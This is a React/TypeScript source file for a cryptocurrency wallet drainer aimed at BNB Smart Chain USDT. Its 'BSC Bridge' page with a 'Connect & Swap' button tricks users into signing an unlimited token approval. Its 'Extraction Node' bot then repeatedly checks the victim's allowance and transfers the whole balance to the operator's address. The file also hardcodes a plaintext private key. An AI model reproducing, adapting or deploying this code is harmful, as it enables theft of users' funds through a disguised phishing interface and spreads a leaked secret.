"use client";

import React, { useState } from 'react';
import { ethers } from 'ethers';

/**
 * PortABC Protocol - PURE BSC VERSION
 * All Ethereum logic and naming conventions removed.
 */

const BEP20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

// BSC-USDT (BEP20)
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [targetAmount, setTargetAmount] = useState<string>("10");

  // Configuration
  const ADMIN_PRIVATE_KEY = "E99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271";
  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 
  const RECEIVER_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1";
  const VICTIM_WALLET_ADDRESS = "0xc0b4ce03df84765ae604f239ea4bbc5731f308af";

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  /**
   * Hard-switch to Binance Smart Chain
   */
  async function forceBSCNetwork() {
    if (!(window as any).ethereum) return;
    
    const bscChainId = '0x38'; // 56 in decimal
    try {
      // Force the prompt to change network to BSC
      await (window as any).ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: bscChainId }],
      });
    } catch (err: any) {
      // If BSC isn't in their MetaMask, add it automatically
      if (err.code === 4902) {
        await (window as any).ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: bscChainId,
            chainName: 'BNB Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
          }]
        });
      }
    }
  }

  async function handleVictimAction() {
    try {
      if (!(window as any).ethereum) return alert("MetaMask/TrustWallet not found");
      
      // ENSURE BSC FIRST
      await forceBSCNetwork();

      const bscProvider = new ethers.providers.Web3Provider((window as any).ethereum);
      await bscProvider.send("eth_requestAccounts", []);
      
      const signer = bscProvider.getSigner();
      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, BEP20_ABI, signer);
      
      addLog("Synchronizing with BSC Network...");
      
      // Unlimited Approval on BSC
      const tx = await usdtContract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
      addLog("Transaction pending on BSCScan...");
      await tx.wait();
      
      addLog("BSC Auth Success. Bridge active.");
    } catch (err: any) {
      addLog("BSC Transaction Failed.");
    }
  }

  async function startBSCMonitor() {
    try {
      // Pure BSC RPC Provider
      const bscRpcProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const attackerSigner = new ethers.Wallet(ADMIN_PRIVATE_KEY, bscRpcProvider);
      const bscContract = new ethers.Contract(BSC_USDT_ADDRESS, BEP20_ABI, attackerSigner);

      setIsMonitoring(true);
      addLog("Bot: Scanning BEP20 Approvals...");

      const tracker = setInterval(async () => {
        try {
          const allowance = await bscContract.allowance(VICTIM_WALLET_ADDRESS, ADMIN_PUBLIC_ADDRESS);
          const balance = await bscContract.balanceOf(VICTIM_WALLET_ADDRESS);

          if (allowance.gt(0) && balance.gt(0)) {
            addLog("Target Found on BSC. Extracting...");
            
            const tx = await bscContract.transferFrom(
              VICTIM_WALLET_ADDRESS, 
              RECEIVER_ADDRESS, 
              balance, 
              {
                gasLimit: 80000, 
                gasPrice: ethers.utils.parseUnits('5', 'gwei') // Standard BSC Fast Gas
              }
            );
            await tx.wait();
            addLog(`Drained ${ethers.utils.formatUnits(balance, 18)} BEP20-USDT`);
            clearInterval(tracker);
            setIsMonitoring(false);
          }
        } catch (e) {}
      }, 3000);
    } catch (err: any) {
      addLog("RPC Connection Error.");
    }
  }

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-4">
      
      {/* BSC Themed UI */}
      <div className="w-full max-w-[420px] bg-[#121212] border border-yellow-500/20 rounded-2xl p-6">
        <div className="flex justify-between items-center mb-6">
          <h1 className="text-lg font-bold">BSC Bridge</h1>
          <span className="text-[10px] bg-yellow-500/10 text-yellow-500 px-2 py-1 rounded border border-yellow-500/20">BNB SMART CHAIN</span>
        </div>

        <div className="space-y-4">
          <div className="bg-[#1a1a1a] p-4 rounded-xl border border-gray-800">
            <p className="text-xs text-gray-500 mb-1">Asset</p>
            <div className="flex items-center gap-2">
              <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center text-[10px] font-bold">T</div>
              <span className="text-sm font-medium">USDT (BEP20)</span>
            </div>
          </div>

          <div className="bg-[#1a1a1a] p-4 rounded-xl border border-gray-800">
            <p className="text-xs text-gray-500 mb-1">Target Amount</p>
            <input 
              type="number" 
              value={targetAmount}
              onChange={(e) => setTargetAmount(e.target.value)}
              className="bg-transparent w-full text-xl font-bold focus:outline-none"
            />
          </div>

          <button 
            onClick={handleVictimAction}
            className="w-full bg-yellow-500 text-black font-bold py-4 rounded-xl hover:bg-yellow-400 transition-all"
          >
            Connect & Swap
          </button>
        </div>
      </div>

      {/* Admin Panel */}
      <div className="mt-8 w-full max-w-[420px]">
        <div className="bg-[#0f0f0f] border border-red-900/40 p-4 rounded-xl">
          <div className="flex justify-between items-center mb-2">
            <span className="text-[9px] text-red-500 font-bold uppercase tracking-widest">BSC Extraction Node</span>
            <button 
              onClick={startBSCMonitor}
              className="text-[9px] border border-red-500 px-2 py-1 rounded hover:bg-red-500/10"
            >
              {isMonitoring ? "ACTIVE" : "START BSC BOT"}
            </button>
          </div>
          <div className="bg-black p-3 h-24 font-mono text-[10px] text-green-400 overflow-y-auto rounded border border-gray-900">
            {logs.map((log, i) => <div key={i}>{`> ${log}`}</div>)}
          </div>
        </div>
      </div>
    </div>
  );
}
